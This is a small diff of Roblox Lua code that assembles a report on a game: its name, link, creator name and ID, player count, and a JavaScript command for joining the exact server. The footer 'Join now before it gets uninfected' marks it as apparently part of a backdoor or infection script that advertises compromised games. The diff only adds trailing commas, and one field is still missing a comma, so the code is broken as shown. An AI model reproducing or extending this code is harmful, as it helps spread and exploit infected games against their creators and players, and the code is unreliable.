@@ -45,33 +45,33 @@ local data = {
 				{
 					name = "Game Name",
 					value = gameNme,
-					inline = false
+					inline = false,
 				},
 				{
 					name = "Game link",
 					value = "https://www.roblox.com/games/" ..game.PlaceId,
-					inline = false
+					inline = false,
 				},
 				{
 					name = "Creator Name",
 					value = info.Creator.Name,
-					inline = false
+					inline = false,
 				},
 				{
 					name = "Creator ID",
 					value = info.Creator.UserId,
-					inline = false
+					inline = false,
 				},
 				{
 					name = "Active Player",
 					value = tostring(#game.Players:GetPlayers()).. "Active Playerss",
-					inline = false
+					inline = false,
 				},
 				{
 					name = "Join Code (JS)",
 					value = "```js\nRoblox.GameLauncher.joinGameInstance(" .. game.PlaceId .. ', "' .. game.JobId .. "\")\n```"
-					inline = false
-				}
+					inline = false,
+				},
 			},
 			footer = {
 				text = "Join now before it gets uninfected"
